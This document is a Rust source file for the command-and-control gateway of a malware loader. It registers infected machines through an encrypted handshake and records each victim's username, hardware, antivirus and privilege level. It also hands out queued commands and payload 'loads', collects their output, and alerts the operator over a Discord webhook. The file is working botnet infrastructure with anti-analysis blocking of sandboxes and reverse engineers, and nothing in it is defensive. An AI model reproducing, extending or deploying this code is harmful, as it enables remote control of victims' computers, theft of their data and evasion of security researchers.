use crate::web_paths::*;

#[get("/{tail:.*}")]
pub async fn gateway_get_block(req: HttpRequest) -> impl Responder {

    let mut connection: Conn = obtain_connection().await;
    let ip = req.peer_addr().unwrap().ip().to_string();
    let req_headers: &HeaderMap = req.headers();
    
    let mut found = false;
    for header in req_headers {if header.0 == "User-Agent" && header.1 == &*USERAGENT.read().unwrap() {found = true;}}

    if !found {print!("not found"); return resp_unauthorised()}
    
    if is_client_blocked(&mut connection, "N/A", &ip).await {
        fprint("restricted", &format!("{} tried to block themselves even though they already are.", ip.yellow()));
        return resp_unauthorised();
    };

    let ip: String = req.peer_addr().unwrap().ip().to_string();
    block_client(&mut connection, "N/A", "Client blocked themselves. Reverse engineering or sandbox.", &ip, 0).await;
    return resp_unauthorised();
}

#[post("/{tail:.*}")]
pub async fn gateway(params: web::Path<String>, req_body: String, req: HttpRequest) -> impl Responder {
    let gateway_path = &*GATEWAY_PATH.read().unwrap();
    let req_headers: &HeaderMap = req.headers();
    let ip: String = req.peer_addr().unwrap().ip().to_string();

    if &params.to_string() != gateway_path {return resp_unauthorised()}

    let mut found = false;
    for header in req_headers { if header.0 == "User-Agent" && header.1 == &*USERAGENT.read().unwrap() {found = true;} }

    if !found {
        fprint("debug", &format!("{} sent a request with an invalid user agent", &ip.magenta()));
        return resp_unauthorised()
    }

    const HANDSHAKE_P1: bool = true;
    const HANDSHAKE_P2: bool = false;

    const HANDSHAKE_P1_PAYLOAD_LENGTH: usize = 64;
    let connection_type = req_body.len() == HANDSHAKE_P1_PAYLOAD_LENGTH;

    let connection_interval = *CONNECTION_INTERVAL.read().unwrap();
    let connection_interval_buffer = *CONNECTION_INTERVAL_BUFFER.read().unwrap();
    let mut connection: Conn = obtain_connection().await;

    if is_client_blocked(&mut connection, "N/A", &ip).await {
        fprint("restricted", &format!("{} tried sending a request while blocked.", ip));
        return resp_unauthorised();
    }
         
    match connection_type {
        HANDSHAKE_P2 => {  // Handle client data being inputted into db and handle registered client traffic

            let encryption_key = match get_encryption_key_from_ip(&mut connection, &ip).await {
                Ok(r) => r,
                Err(GenericError::_Expired) => {
                    block_client(&mut connection, "N/A", "Submitted registration using expired key.", &ip, 0).await;
                    return resp_unauthorised();
                },
                Err(_) => {
                    block_client(&mut connection, "N/A", "Handshake P2 submitted with invalid encryption key.", &ip, 0).await;
                    return resp_unauthorised();
                }
            };

            fprint("debug", &format!("{} resolved encryption key using ip {}", &ip.magenta(), encryption_key.magenta()));

            let decrypted_payload_content = match aes_256cbc_decrypt(&req_body, encryption_key.as_bytes()) {
                Ok(r) => r,
                Err(_) => {
                    block_client(&mut connection, "N/A", "Sent a request with an invalid AES key.", &ip, 0).await;
                    return resp_badrequest();
                }
            };


            let submitted_json = match serde_json::from_str(str::from_utf8(&decrypted_payload_content).unwrap()) {
                Ok(result) => result,
                Err(_) => {
                    block_client(&mut connection, "N/A", "Sent a registration request without valid JSON.", &ip, 1200).await;
                    return resp_badrequest();
                }
            };

            fprint("debug", &format!("{} sent P2 json: {}", &ip.magenta(), submitted_json));
            
            let (client_id, is_registering) = {
                if all_keys_valid(&submitted_json, // If client registering
                    vec!["version", "uac", "username", "guid", "cpu", "gpu", "ram", "antivirus", "path", "pid", "build_id"],
                    vec!["u64", "bool", "String", "String", "String", "String", "u64", "String", "String", "u64", "String"]
                ) {
                   (&String::from(&sha256::digest(format!("{}{}{}", 
                   key_to_string(&submitted_json, "guid"), 
                   key_to_string(&submitted_json, "username"),
                   &*API_SECRET.read().unwrap()
               ))[..16]), true)
                } else {
                    (&ip_to_client_id(&mut connection, &ip).await, false)
                }
            };

            fprint("debug", &format!("{} resolved client id via ip {}", &ip.magenta(), client_id.magenta()));

            if !is_registering {
                if is_client(&mut connection, client_id).await {    
                    let encryption_key = match get_encryption_key(&mut connection, client_id).await {
    
                        Ok(result) => result,
                        Err(GenericError::_Expired) => {
                            block_client(&mut connection, "N/A", "Request sent with expired encryption key.", &ip, 1200).await;
                            return resp_unauthorised();
                        },
                        Err(error) => {
                            fprint("error", &format!("(HANDSHAKE_P2 get_encryption_key): {:?}", error));
                            return resp_servererror();
                        }
                    };

                    fprint("debug", &format!("{} is submitting an action \"{}\"", &ip.magenta(), key_to_string(&submitted_json, "action")));
    
                    match key_to_string(&submitted_json, "action").as_str() {
                        "heartbeat" => {
                            let last_heartbeat_time = get_timestamp() - get_last_seen(&mut connection, client_id).await;
                            fprint("debug", 
                                &format!("{} {} last heartbeat was {}s ago", 
                                    &ip.magenta(), 
                                    client_id.magenta(), 
                                    last_heartbeat_time.to_string().magenta(), 
                                )
                            );

                            if last_heartbeat_time + connection_interval_buffer < connection_interval {
                                block_client(&mut connection, &client_id, "Sending heartbeats too frequently.", &ip, 1200).await;
                                return resp_unauthorised();
                            }
    
                            update_last_seen(&mut connection, &client_id).await;
                            match get_current_client_command(&mut connection, &client_id).await {
    
                                Ok((command_id, cmd_args, cmd_type)) => {

                                    let cmd_args = {
                                        &serde_json::from_slice::<serde_json::Value>(&parse_storage_read(&cmd_args)).unwrap()
                                    };
                                    return resp_ok_encrypted(&json!({
                                        "command_id": command_id,
                                        "cmd_args": cmd_args,
                                        "cmd_type": cmd_type
                                    }).to_string(),  encryption_key.as_bytes()).await;
                                },
    
                                Err(GenericError::NoRows) => {
                                    return resp_ok_encrypted("Ok", encryption_key.as_bytes()).await;
                                },
                                
                                Err(_) => {
                                    fprint("error", "At gateway (command_info)");
                                    return resp_servererror();
                                },
                            }
                        },
    
                        "submit_output" => {
                            if !all_keys_valid(&submitted_json, vec!["command_id", "output"], vec!["String", "String"]) {
                                block_client(&mut connection, &client_id, "Didn't fill out all fields when submitting output.", &ip, 0).await;
                                return resp_badrequest();
                            }
                    
                            let command_id = key_to_string(&submitted_json, "command_id");
                            let output_id = generate(8, CHARSET);
                            let output = key_to_string(&submitted_json, "output");
    
                            if output.len() > (*MAX_OUTPUT_SUBMISSION_KB.read().unwrap() as usize) * 1024 {
                                block_client(&mut connection, client_id, "Sending too large of a submission.", &ip, 1200).await;
                                return resp_unauthorised();
                            }
                    
                            match get_command_info(&mut connection, &command_id).await {
                                
                                Ok((command_id, load_id, cmd_args, cmd_type, time_issued)) => {
                                    match connection.exec_drop(
                                
                                        r"INSERT INTO outputs (
                                        output_id, command_id,  load_id,
                                        client_id, cmd_args, 
                                        cmd_type, output, 
                                        time_issued, time_received
                                        ) VALUES 
                                        
                                        ( :output_id, :command_id, :load_id,
                                        :client_id, :cmd_args, 
                                        :cmd_type, :output, 
                                        :time_issued, :time_received)",
                        
                                        params! {
                                            "output_id" => &output_id,
                                            "command_id" => &command_id,
                                            "load_id" => &load_id,
                                            "client_id" => &client_id,
                                            "cmd_args" => &cmd_args,
                                            "cmd_type" => &cmd_type,
                                            "output" => &parse_storage_write(output.as_bytes()),
                                            "time_issued" => &time_issued,
                                            "time_received" => get_timestamp(),
                        
                                        }
                                    ).await {
                                        Ok(_) => {
                                            connection.exec_drop(r"DELETE FROM commands WHERE command_id = :command_id", params! { "command_id" => &command_id }).await.unwrap();
    
                                            if *NOTIFICATION_ON_COMMAND_COMPLETION.read().unwrap() {
                                                discord_webhook_push(
                                                    "📦 A client submitted an output.",
                                                    &format!("```ansi\n[2;36mClient ID::[0m {}\n[2;36mOutput ID::[0m {}\n[2;36mCmd Type::[0m {}```",
                                                        &client_id,
                                                        &output_id,
                                                        &cmd_type,
                                                    ),
                                                    0xffd700,
                                                    false
                                                ).await
                                            }
                                        
                                            fprint("info", &format!("({}) {} completed command {} with type {}.", &ip, &client_id, &command_id, &cmd_type));
                                
                                            return resp_ok_encrypted("Submitted output successfully.", encryption_key.as_bytes()).await;
                                        },
                                        Err(e) => fprint("error", &format!("Unable to insert output: {}",e))
                                    };
                                },
                                Err(_) => {
                                    fprint("failure", &format!("({}) {} tried submitting an output with an invalid command id. No action taken.", ip.red(), client_id.red()));
                                    return resp_badrequest();
                                }
                            };
                        }
    
                        &_ => {
                            fprint("error", &format!("({}) {} sent a request containing an unsupported action.", &ip, &client_id));
                            return resp_unsupported();
                        }
                    }
    
                    return resp_ok_encrypted("Well done! Connection succesfully established.", encryption_key.as_bytes()).await;
    
                }
            }
            fprint("debug", &format!("{} is_registering: {}", &ip.magenta(),is_registering.to_string().magenta()));

            if is_registering {
                let purgatory_selection_sql: std::result::Result<QueryResult<'_, '_, _>, Error> = connection.exec_iter(
                    r"SELECT encryption_key,expiration_time,request_ip FROM purgatory WHERE request_ip = :request_ip ORDER BY expiration_time DESC",
                    params! {"request_ip" => &ip}
                ).await;

                let selected_purgatory = purgatory_selection_sql.unwrap().collect::<Row<>>().await;
                if selected_purgatory.as_ref().unwrap().len() == 0 {block_client(&mut connection, "N/A", "Submitted and requested IPs for handshake don't match.", &ip, 0).await;}

                for row in selected_purgatory.unwrap() {

                    let binding = value_to_str(&row, 0);
                    let provided_encryption_key = binding.as_bytes();
                    
                    if value_to_u64(&row, 1) < get_timestamp() {
                        block_client(&mut connection, "N/A", "Took to long to solve the hash.", &ip, 1200).await;
                        return resp_unauthorised();
                    }

                    fprint("debug", &format!("{} has a matching encryption key {:?}", &ip.magenta(), provided_encryption_key));

                    let client_information = match aes_256cbc_decrypt(&req_body, provided_encryption_key) {
                        Ok(result) => result,
                        Err(_) => {
                            block_client(&mut connection, "N/A","Client sent a registration request encrypted with the wrong aes key.", &ip, 1200).await;
                            return resp_unauthorised();
                        }
                    }; 
                    
                    drop( // Bitches about var being unused if drop isnt used :(
                        connection.exec_drop(r"DELETE FROM purgatory WHERE encryption_key = :encryption_key", 
                        params! { "encryption_key" => &provided_encryption_key }).await
                    );

                    let client_data_json = match serde_json::from_str(str::from_utf8(&client_information).unwrap()) {
                        Ok(result) => result,
                        Err(_) => {
                            block_client(&mut connection, "N/A", "Sent a registration request without valid JSON.", &ip, 1200).await;
                            return resp_badrequest();
                        }
                    };

                    fprint("debug", &format!("{} is registering with json {}", &ip.magenta(), client_data_json));

                    if !all_keys_valid(&client_data_json, 
                        vec!["version", "uac", "username", "guid", "cpu", "gpu", "ram", "antivirus", "path", "pid", "build_id"],
                        vec!["u64", "bool", "String", "String", "String", "String", "u64", "String", "String", "u64", "String"]
                    ) {
                        block_client(&mut connection, "N/A", "Missing one or more JSON keys.", &ip, 0).await;
                        return resp_badrequest();
                    }

                    let client_id: String = String::from(&sha256::digest(format!("{}{}{}", 
                        key_to_string(&client_data_json, "guid"), 
                        key_to_string(&client_data_json, "username"),
                        &*API_SECRET.read().unwrap()
                    ))[..16]);

                    fprint("debug", &format!("{} generated client id from client's provided information {}", &ip.magenta(), client_id.magenta()));

                    if !is_client(&mut connection, &client_id).await {
                        match connection.exec_drop(
                            r"INSERT INTO clients (
                                client_id, version, uac, ip,
                                country, 
                                username, guid, cpu, 
                                gpu, ram, antivirus, 
                                path, pid, last_seen, 
                                first_seen, encryption_key,
                                key_expiration, build_id
                            ) 
                            
                            VALUES (
                                :client_id, :version, :uac, :ip,
                                :country,
                                :username, :guid, :cpu,
                                :gpu, :ram, :antivirus,
                                :path, :pid, :last_seen,
                                :first_seen, :encryption_key,
                                :key_expiration, :build_id
                            )",
                            params! {
                                "client_id" => &client_id,
                                "version" => key_to_u64(&client_data_json, "version"),
                                "uac" => key_to_bool(&client_data_json, "uac"),
                                "ip" => &ip,
                                "country" => ip_to_country(&ip).await,
                                "username" => key_to_string(&client_data_json, "username"),
                                "guid" => key_to_string(&client_data_json, "guid"),
                                "cpu" => key_to_string(&client_data_json, "cpu"),
                                "gpu" => key_to_string(&client_data_json, "gpu"),
                                "ram" => key_to_u64(&client_data_json, "ram"),
                                "antivirus" => key_to_string(&client_data_json, "antivirus"),
                                "path" => key_to_string(&client_data_json, "path"),
                                "pid" => key_to_u64(&client_data_json, "pid"),
                                "last_seen" => get_timestamp(),
                                "first_seen" => get_timestamp(),
                                "encryption_key" => &provided_encryption_key,
                                "key_expiration" => get_timestamp() + connection_interval + connection_interval_buffer,
                                "build_id" => key_to_string(&client_data_json, "build_id"),
                            }
                        ).await {
                            Ok(_) => {

                                if *NOTIFICATION_ON_CLIENT_REGISTRATION.read().unwrap() {
                                    discord_webhook_push(
                                        ":tada: A new client has registered with your loader.",
                                        &format!("```ansi\n[2;36mID:[0m {}\n[2;36mIP:[0m {}\n[2;36mUsername:[0m {}\n[2;36mCPU:[0m {}\n[2;36mGPU:[0m {}\n```",
                                            &client_id,
                                            &ip,
                                            key_to_string(&client_data_json, "username"),
                                            key_to_string(&client_data_json, "cpu"),
                                            key_to_string(&client_data_json, "gpu")
                                        ),
                                        0xffd700,
                                        false
                                    ).await
                                }

                                fprint("success", &format!("{}", 
                                    format!("({}) {} registered with username {}", 
                                    &ip.yellow(),  
                                    client_id.yellow(), 
                                    key_to_string(&client_data_json, "username").yellow()
                                )));
                            },
                            Err(e) =>  {
                                fprint("error", &format!("Unable to insert new client data into db: {}",e));
                                return resp_servererror();
                            }
                        };
                    } else {
                        if !is_client_online(&mut connection, &client_id).await {
                            match connection.exec_drop(
                                r"UPDATE clients SET 
                                uac = :uac, ip = :ip, country = :country, cpu = :cpu, gpu = :gpu, ram = :ram, 
                                antivirus = :antivirus, path = :path, pid = :pid, last_seen = :last_seen, 
                                encryption_key = :encryption_key, key_expiration = :key_expiration, build_id = :build_id
                                WHERE client_id = :client_id",
                                params! {
                                    "uac" => key_to_bool(&client_data_json, "uac"),
                                    "ip" => &ip,
                                    "country" => ip_to_country(&ip).await,
                                    "cpu" => key_to_string(&client_data_json, "cpu"),
                                    "gpu" => key_to_string(&client_data_json, "gpu"),
                                    "ram" => key_to_u64(&client_data_json, "ram"),
                                    "antivirus" => key_to_string(&client_data_json, "antivirus"),
                                    "path" => key_to_string(&client_data_json, "path"),
                                    "pid" => key_to_u64(&client_data_json, "pid"),
                                    "last_seen" => get_timestamp(),
                                    "client_id" => &client_id,
                                    "encryption_key" => &provided_encryption_key,
                                    "key_expiration" => get_timestamp() + connection_interval,
                                    "build_id" => key_to_string(&client_data_json, "build_id")
                                }
                            ).await {
                                Ok(_) => {

                                    if *NOTIFICATION_ON_CLIENT_RECONNECTION.read().unwrap() {
                                        discord_webhook_push(
                                            "🤝 An old client has reconnected with your loader.",
                                            &format!("```ansi\n[2;36mID:[0m {}\n[2;36mIP:[0m {}\n[2;36mUsername:[0m {}\n[2;36mCPU:[0m {}\n[2;36mGPU:[0m {}\n```",
                                                &client_id,
                                                &ip,
                                                key_to_string(&client_data_json, "username"),
                                                key_to_string(&client_data_json, "cpu"),
                                                key_to_string(&client_data_json, "gpu")
                                            ),
                                            0xffd700,
                                            false
                                        ).await
                                    }

                                    fprint("success", &format!("{}", 
                                        format!("({}) {} with username {} reconnected.", 
                                        &ip.yellow(),  
                                        client_id.yellow(), 
                                        key_to_string(&client_data_json, "username").yellow()
                                    )));

                                },
                                Err(e) => {
                                    fprint("error", &format!("Unable to update client data: {}", e));
                                    return resp_servererror();
                                }
                            };
        
                        } else {
                            block_client(&mut connection, &client_id, "Re-registering too quickly.", &ip, 1200).await;
                            return resp_servererror();
                        }
                    }
                    
                    let load_ids = connection.exec_map(r"
                        SELECT load_id, cmd_args, cmd_type 
                        FROM loads 
                        WHERE (is_recursive = 1 
                        OR (
                            load_id NOT IN (
                                SELECT load_id FROM outputs WHERE client_id = :client_id
                            ) 
                            AND required_amount!= completed_amount
                        ))
                    
                    
                    ", params! {
                        "client_id" => &client_id,
                    }, |row: Row| {
                        (value_to_str(&row, 0), value_to_str(&row, 1), value_to_str(&row, 2))
                    }).await;
        
                    match load_ids {
                        Ok(_) => (),
                        Err(ref error) => {
                            fprint("error", &format!("Unable to fetch load ids: {}", error));
                        }
                    };
                    
                    for result in load_ids.unwrap() {
                        increment_load(&mut connection, &result.0, 1).await;
                        task_client(&mut connection, &client_id, &result.0, &result.1, &result.2).await;
                    }

                    update_last_seen(&mut connection, &client_id).await;
                    return resp_ok_encrypted(&client_id, provided_encryption_key).await;
                }

               
            }
        }
            
        // Part of handshake where we issue the hash that the client needs to crack
        HANDSHAKE_P1 => {
            
            if is_suspicious_ip(&ip).await {
                block_client(&mut connection, "N/A", "IP marked as suspicious, registration rejected.", &ip, 1200).await;
                return resp_unauthorised()
            }
            
            // Read client bytes
            let decrypted_first_half = match aes_256cbc_decrypt(&req_body, &*INITIAL_ENCRYPTION_KEY.read().unwrap().as_bytes()) {
                Ok(result) => result,
                Err(_) => {
                    block_client(&mut connection, "N/A","Client sent a registration request encrypted with the wrong initial encryption key (P1)", &ip, 1200).await;
                    return resp_unauthorised();
                }
            }; 
            
            let client_bytes = decrypted_first_half;
            fprint("debug", &format!("{} obtained client bytes {:?}", &ip.magenta(), client_bytes));

            let items = random_bytes(8);
            let mut all_bytes: Vec<Vec<u8>> = vec![];

            for perm in items.iter().permutations(items.len()).unique() {
                let mut temp = vec![];
                for byte in perm { temp.push(*byte); }
                all_bytes.push(temp);
            }
            
            let server_bytes: &Vec<u8> = all_bytes.choose(&mut rand::thread_rng()).unwrap();
            let client_seed: &Vec<u8> = server_bytes; //all_bytes.choose(&mut rand::thread_rng()).unwrap();

            fprint("debug", &format!("{} generated server seed {:?}", &ip.magenta(), &server_bytes));

            let server_bytes_hash = argon2_hash(&server_bytes.as_slice());
            fprint("debug", &format!("{} server bytes hash {:?}", &ip.magenta(), server_bytes_hash));

            let encryption_key = format!("{}", 
                &sha256::digest([client_bytes.clone(), server_bytes.clone()].concat())[..32]
            );
            fprint("debug", &format!("{} generated encryption key {:?}", &ip.magenta(), encryption_key));

            // TODO: Add check here to see if previous key expired before they request a new one.

            drop(connection.exec_drop(
                r"DELETE FROM purgatory WHERE request_ip = :request_ip",
                params! {"request_ip" => &ip}
            ).await);

            let expiration_time = &get_timestamp() + *PURGATORY_INTERVAL.read().unwrap();
            match connection.exec_drop(
            
                r"INSERT INTO purgatory (
                    encryption_key, expiration_time, request_ip
                ) VALUES 
                
                ( :encryption_key, :expiration_time, :request_ip )",

                params! {
                    "encryption_key" => &encryption_key,
                    "expiration_time" => expiration_time,
                    "request_ip" => &ip

                }
            ).await {
                Ok(_) => (),
                Err(e) => fprint("error", &format!("Failed to insert key into purgatory: {}", e))
            };
            fprint("debug", &format!("{} completed handshake P1, expiration time: {}", &ip.magenta(), expiration_time.to_string().magenta()));

            return resp_ok_encrypted(&json!({
                "hash": server_bytes_hash,
                "seed": BASE64_STANDARD.encode(&client_seed)
            }).to_string(), &client_bytes).await;

        }
    };

    block_client(&mut connection, "N/A", "Sending malformed requests or sending too quickly.", &ip, 1200).await;
    return resp_unauthorised();
}

